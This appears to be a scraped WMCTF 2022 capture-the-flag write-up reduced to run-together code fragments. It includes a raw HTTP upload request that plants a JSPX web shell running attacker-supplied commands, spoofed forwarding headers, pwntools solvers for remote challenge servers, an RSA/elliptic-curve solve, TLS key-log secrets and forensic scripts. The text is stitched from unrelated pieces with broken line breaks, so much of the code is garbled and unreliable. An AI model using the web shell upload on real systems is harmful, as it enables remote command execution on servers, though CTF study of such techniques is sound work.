text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRl8eeewp2oyUjEUQContent-Length: 1353------WebKitFormBoundaryRl8eeewp2oyUjEUQContent-Disposition: form-data; name="name"8a8ab0b246dc81120146dc8181a60055------WebKitFormBoundaryRl8eeewp2oyUjEUQContent-Disposition: form-data; name="documentTitle"1.jspx------WebKitFormBoundaryRl8eeewp2oyUjEUQContent-Disposition: form-data; name="file";filename="1.jspx"Content-Type: image/jpeg<jsp:
root xmlns:
jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml"xmlns:c="http://java.sun.com/jsp/jstl/core" version="2.0"><jsp:
directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"/><jsp:
directive.page import="java.util.*"/><jsp:
directive.page import="java.io.*"/><jsp:
directive.page import="sun.misc.BASE64Decoder"/><jsp:
scriptlet><![CDATA[ String tmp = pageContext.getRequest().getParameter("str"); if (tmp != null&&!"".equals(tmp)) { try{ String str = new String((new BASE64Decoder()).decodeBuffer(tmp)); Process p = Runtime.getRuntime().exec(tmp); InputStream in = p.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(in,"GBK")); String brs = br.readLine(); while(brs!=null){ out.println(brs+""); brs = br.readLine(); } }catch(Exception ex){ out.println(ex.toString()); } }]]></jsp:
scriptlet></jsp:
root>------WebKitFormBoundaryRl8eeewp2oyUjEUQ--
from pwn import *import string
# import secrets
from hashlib import sha256
from random import randint, shuffle, choiceimport time #解决有时⽆应答p=remote("1.13.154.182",32758)#1.13.154.182:
31973x=p.recv()print(x)x=x.decode('utf-8')ss=x[12:28]s_sha=x[33:97]st='abcdefghijklmnopqrstuvwxyzABCDEFGHIZKLMNOPQRSTUVWXYZ1234567890'for i1 in st: for i2 in st: for i3 in st: for i4 in st: snew=i1+i2+i3+i4+ss if sha256(snew.encode()).hexdigest()==s_sha: a=snew[:4] p.sendline(a.encode()) break
lis_b=['B0','B1','B2','B3','B4','B5']lis=[0,0,0,0,0,0]x=p.recv()print(x)def send(i): time.sleep(0.066) a1=lis_b[i].encode() p.sendline(a1) print(a1) time.sleep(0.1) x1=p.recv()print(x1) time.sleep(0.066) if b'False' in x1: lis[i]=0 else: lis[i]=1 for ROUND_NUM in range(50): print("round_num",ROUND_NUM) times=0 for i in range(6): send(i) times+=1 #以上测试正常 print(lis) jx=[0,0,0] for i in range(0,6,2): time.sleep(0.066) a1=lis_b[i]+" "+"=="+" "+str(lis[i]) a2=lis_b[i+1]+" "+"=="+" "+str(lis[i+1]) a=a1+" and "+a2 p.sendline(a.encode()) times=times+1 print(a) time.sleep(0.1) x1=p.recv() print(x1) time.sleep(0.066) if b'False' in x1: jx[int(i/2)]=0 else: jx[int(i/2)]=1 print(times) print(jx) #以上测试正常 #9轮之后的判断 jieguo=jx[0]+jx[1]+jx[2] print(jieguo) if jieguo==3: #0错 while(times<13): time.sleep(0.066) a1=b'B0' p.sendline(a1) print(a1) time.sleep(0.1) x1=p.recv() print(x1) times=times+1 print(times)elif jieguo==1: #2错 if jx[0]==1: lis_bnew=[2,3,4,5] for i in lis_bnew: send(i) times+=1 elif jx[1]==1: lis_bnew=[0,1,4,5] for i in lis_bnew: send(i) times+=1 else: lis_bnew=[0,1,2,3] for i in lis_bnew: send(i) times+=1 else:#1错 剩余4次确定两个球 再问⼀遍，对⽐第⼀次结果，结果全真：。结果全假，再问为真。⼀真⼀假，问真若真取第⼀轮，若假取第⼆轮 if jx[0]==0: lis_bnew=[0,1] if jx[1]==0: lis_bnew=[2,3] if jx[2]==0: lis_bnew=[4,5] jx3=[] #询问结果 for i in lis_bnew: time.sleep(0.066) a1=lis_b[i].encode() p.sendline(a1) print(a1) time.sleep(0.1) x3=p.recv() if b'False' in x3: jx3.append(0) else: jx3.append(1)
 print(jx3) times=times+1 print("times=",times) print(lis[i-1],lis[i]) if lis[i]==jx3[1] and lis[i-1]==jx3[0]:#和第⼀次对⽐结果全为真 要么第⼆轮撒谎，要么⼀三轮撒谎。再问⼀遍如果结果全不⼀样。说明⼀三轮撒谎。只有⼀个不⼀样则是第⼆轮撒谎 print("lis和jx相等") jx4=[] a1=lis_b[i-1].encode() p.sendline(a1)print(a1) time.sleep(0.1) x4=p.recv() if b'False' in x4: jx4.append(0) else: jx4.append(1) time.sleep(0.066) times=times+1 a1=lis_b[i].encode() p.sendline(a1) print(a1) time.sleep(0.1) x4=p.recv() if b'False' in x4: jx4.append(0) else: jx4.append(1) time.sleep(0.066) times=times+1 if jx3[0]!=jx4[0] and jx3[1]!=jx4[1]: print("三四轮结果不⼀样") lis[i]=jx4[1] lis[i-1]=jx4[0] elif lis[i]!=jx3[1] and lis[i-1]!=jx3[0]: print("lis和jx全不相等") send(i-1) times+=1 send(i) times+=1 else: tu=0 print("lis和部分相等") if lis[i]==jx3[1]: time.sleep(0.066) a1=lis_b[i].encode() p.sendline(a1) print(a1) time.sleep(0.1) times+=1 x1=p.recv() print(x1) if b'False' in x1: tu=0 else: tu=1 if tu!=lis_b[i]:
lis[i-1]=int(lis[i-1])^1 else: time.sleep(0.066) a1=lis_b[i-1].encode() p.sendline(a1) print(a1) time.sleep(0.1) x1=p.recv() times+=1 print(x1) if b'False' in x1: tu=0 else: tu=1 if tu!=lis_b[i-1]: lis[i]=int(lis[i])^1 while(times<13): p.sendline(a1) print(a1) times=times+1 print(times) time.sleep(0.66) x=p.recv() print(x) #输出结果 print(lis) aaa="" for i in lis: aaa+=str(i)+" " aaa=aaa.encode() print(aaa) p.sendline(aaa) time.sleep(0.1) x=p.recv() print(x)
e = 0x10001n =61262574892917665379101848600282751252633178779864648655116434051615964747592676204833262666589440081296571836666022795166255640192795587508845265816642144669301520989571990670507103278098950563219296310830719975959589061794360407053224254135937766317251283933110936269282950512402428088733821277056712795259c =16002162436420434728223131316901476099110904029045408221515087977802746863468505266500673611412375885221860212238712311981079623398373906773247773552766200431323537510699147642358473715224124662007742017000810447999989426207919068340364725395075614636875116086496704959130761547095168937180751237132642548997G =(3364552845709696244757995625685399274809023621531082895612949981433844727622567352338990765970534554565693355095508508160162961299445890209860508127449468,4874111773041360858453223185020051270111929505293131058858547656851279111764112235653823943997681930204977283843433850957234770591933663960666437259499093)G_3 =(8240596254289477251157504980772167439041663401504657696787046343848644902166655624353107697436635678388969190302189718026343959470011854412337179727187240,4413479999185843948404442728411950785256136111461847698098967018173326770728464491960875264034301169184074110521039566669441716138955932362724194843596479)P.<a>=ZZ[]def add(A,B):x1,y1=Ax2,y2=Bif A==B:l=(3*x1^2+a)/(2*y1)else:l=(y1-y2)/(x1-x2)x3=l^2-x1-x2y3=l*(x1-x3)-y1return (x3,y3)G3=add(add(G,G),G)x,y=G3f=x.numerator()-G_3[0]*x.denominator()g=y.numerator()-G_3[1]*y.denominator()while not g==0:f,g=g,f%gp=GCD(f.numerator(),n)q=n//px1,y1=Gx2,y2=G_3a=((y1^2-y2^2)-(x1^3-x2^3))*inverse_mod(x1-x2,p)%pb=(y1^2-x1^3-a*x1)%pE=EllipticCurve(GF(p),[a,b])g=E(G)d=inverse_mod(e,(p-1)*(q-1))m=pow(c,d,n)print((a,b,m))
a,b,c=(3629864911627283784723617758993690217446918991113173559686999,988958437986133278846018591274848194060347135958347118693976,1910700325063785326106590899271324158468993875758894973739361)m=a<<(606-a.bit_length())m+=b<<(c.bit_length()+1)m+=cprint('wmctf{%s}'%long_to_bytes(m).decode())
from pwn import *import string
# import secrets
from hashlib import sha256
from random import randint, shuffle, choiceimport time #解决有时⽆应答p=remote("1.13.154.182",30725)x=p.recv()print(x)x=x.decode('utf-8')ss=x[12:28]#print(ss)s_sha=x[33:97]#print(s_sha)st='abcdefghijklmnopqrstuvwxyzABCDEFGHIZKLMNOPQRSTUVWXYZ1234567890'for i1 in st: for i2 in st: for i3 in st: for i4 in st: snew=i1+i2+i3+i4+ss if sha256(snew.encode()).hexdigest()==s_sha: a=snew[:4] p.sendline(a.encode()) breaklis_b=['B0','B1','B2','B3','B4','B5']lis=[0,0,0,0,0,0]x=p.recv()print(x)for ROUND_NUM in range(50): times=0 for i in range(6): time.sleep(0.066) a1=lis_b[i].encode() p.sendline(a1) times+=1 print(a1) time.sleep(0.1) x1=p.recv() print(x1) time.sleep(0.066) # #question # a1=lis_b[i].encode() p.sendline(a1) times+=1 print(a1) time.sleep(0.066) x2=p.recv() print(x2) x=x2 if x1==x2: if b'False' in x1: lis[i]=0 else: lis[i]=1 else: #question if times>=14:#防⽌最后⼀次出错 if b'False' in x1: lis[i]=0 else: lis[i]=1 break a1=lis_b[i].encode() p.sendline(a1) times+=1 print(a1) time.sleep(0.66) x3=p.recv() print(x3) x=x3 if b'False' in x3: lis[i]=0 else: lis[i]=1 print(times) time.sleep(0.2) while(times<14): p.sendline(a1) print(a1) times=times+1 print(times) time.sleep(0.66)x=p.recv() print(x) print(lis) aaa="" for i in lis: aaa+=str(i)+" " aaa=aaa.encode() print(aaa) p.sendline(aaa) time.sleep(0.1) x=p.recv() print(x)
CLIENT_HANDSHAKE_TRAFFIC_SECRET1002eec63c7da0d66827ebc83af50e00550704d76420b1d039f9ef2222641dd248f1197d22ef93778c14f15ddbbf9a53df20cf74c9c68b9f3073fa9f405da995SERVER_HANDSHAKE_TRAFFIC_SECRET1002eec63c7da0d66827ebc83af50e00550704d76420b1d039f9ef2222641dd238b4671e9ded337c7066e3830563f4519f3bf4effb13d046c2e62847329f0787CLIENT_TRAFFIC_SECRET_01002eec63c7da0d66827ebc83af50e00550704d76420b1d039f9ef2222641dd2457d3990a971aad9a308ea0af62db5745d99a75e0c484487289f9e760b33a43fSERVER_TRAFFIC_SECRET_01002eec63c7da0d66827ebc83af50e00550704d76420b1d039f9ef2222641dd2dc730355e51308929f66eabb06458080459810bdd6b27de884a1c1fdc5385b1e
import ( "github.com/gin-gonic/gin" "github.com/gorilla/websocket" "net/http")var flags = "WMCTF{WebS0cket_And"var upGrader = websocket.Upgrader{ CheckOrigin: func(r *http.Request) bool { return true },}//发送flagfunc flag(c *gin.Context) { //升级get请求为webSocket协议 ws, err := upGrader.Upgrade(c.Writer, c.Request, nil) if err != nil { return } defer ws.Close() //循环把flags给传输过去 for { //读取ws中的数据 mt, message, err := ws.ReadMessage()if err != nil { break } if string(message) == "flag" { //写⼊ws数据 for i := 0; i < len(flags); i++ { ch := string(flags[i]) err := ws.WriteMessage(mt, []byte(ch)) //sleep⼀秒 //time.Sleep(time.Second) if err != nil { break } } } }}func main() { bindAddress := "localhost:
2303" r := gin.Default() r.GET("/flag", flag) r.Run(bindAddress)}
function randomString(e) { e = e || 32;var t = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678",a = t.length,n = "";for (i = 0; i < e; i++) n += t.charAt(Math.floor(Math.random() * a));
return n}function encrypto( str, xor, hex ) {if ( typeof str !== 'string' || typeof xor !== 'number' || typeof hex !== 'number') {return; }let resultList = [];hex = hex <= 25 ? hex : hex % 25;for ( let i=0; i<str.length; i++ ) {let charCode = str.charCodeAt(i);charCode = (charCode * 1) ^ xor;charCode = charCode.toString(hex);resultList.push(charCode); }let splitStr = String.fromCharCode(hex + 97);let resultStr = resultList.join( splitStr );
return resultStr;}var b1 = new Encode()var ws = new WebSocket("ws://127.0.0.1:
2303/flag"); ws.onopen = function(evt) { console.log("Connection open ..."); ws.send("flag"); }; ws.onmessage = function(evt) { var rstr = randomString(5)n = evt.datares = n.padEnd(9,rstr)s1= encrypto(res,15,25)f1 = b1.encode(s1)ws.send(f1)console.log('Connection Send:'+f1)}; ws.onclose = function(evt) { console.log("Connection closed."); }; function Encode() {_keyStr = "/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC";this.encode = function (input) {var output = "";var chr1, chr2, chr3, enc1, enc2, enc3, enc4;var i = 0;input = _utf8_encode(input);while (i < input.length) {chr1 = input.charCodeAt(i++);chr2 = input.charCodeAt(i++);chr3 = input.charCodeAt(i++);enc1 = chr1 >> 2;enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);enc4 = chr3 & 63;if (isNaN(chr2)) {enc3 = enc4 = 64; } else if (isNaN(chr3)) {enc4 = 64; }output = output +_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +_keyStr.charAt(enc3) + _keyStr.charAt(enc4); }return output; }_utf8_encode = function (string) {string = string.replace(/rn/g,"n");var utftext = "";for (var n = 0; n < string.length; n++) {var c = string.charCodeAt(n);if (c < 128) {utftext += String.fromCharCode(c); } else if((c > 127) && (c < 2048)) {utftext += String.fromCharCode((c >> 6) | 192);utftext += String.fromCharCode((c & 63) | 128); } else {utftext += String.fromCharCode((c >> 12) | 224);utftext += String.fromCharCode(((c >> 6) & 63) | 128);utftext += String.fromCharCode((c & 63) | 128); } }return utftext; }}
dicts = {}with open('./out!!','r',encoding='utf-8') as f:
for i in f.readlines():
data = i.split(':')[2].replace('n','')flag1 = data[0:3]flag2 = data[-1]dicts[flag1] = flag2
# print(dicts)flag = ''with open('./flag.txt','r',encoding='utf-8') as f:
for i in f.readlines():
data = i.split(',')[1][0:3]flag += dicts[data]print(flag)#output:
WMCTF{LOL_StR1ngs_1s_F@ke_BUT
WMCTF{LOL_StR1ngs_1s_F@ke_BUT_HTTP3_1s_C000L}
import osfor root, dirs, files, rootfd in os.fwalk('./PaxHeaders.2659874'):
print(root, "consumes", end="")files = [root +'/' + name for name in files]data = dict()count = 0for i in files:
with open(i,'r') as f:
data = f.readlines()print(data)df.loc[count,'filename'] = idf.loc[count,'mtime'] = data[0].split("=")[1].replace('n','')df.loc[count,'atime'] = data[1].split("=")[1].replace('n','')df.loc[count,'ctime'] = data[2].split("=")[1].replace('n','')count += 1print(count)
import pandas as pddf_new = pd.read_excel('sort_1.xlsx')s = [ './pics/' + i.split('/')[-1] for i in df_new['filename']]for num in range(600,1024-3):a = Image.open(s[num])w,h = a.sizeb = Image.open(s[num+1])d = Image.open(s[num+2])c = Image.new("L",(w,h))for i in range(0,w-2):
for j in range(0,h):ra = a.getpixel((i,j))rb = b.getpixel((i+1,j))rd = d.getpixel((i+2,j))if ra == rb == rd :rc = 255else:rc = 0c.putpixel((i,j),rc) # print(r) # news = img1.getpixel((i,j))c.save("./newnew/" + s[num].split('/')[-1])
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/10-1661739722.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/4-1661739723.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/5-1661739724.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/3-1661739725.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/5-1661739726.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/5-1661739726.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/1-1661739727.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/7-1661739727.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/0-1661739728.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/8-1661739728.png)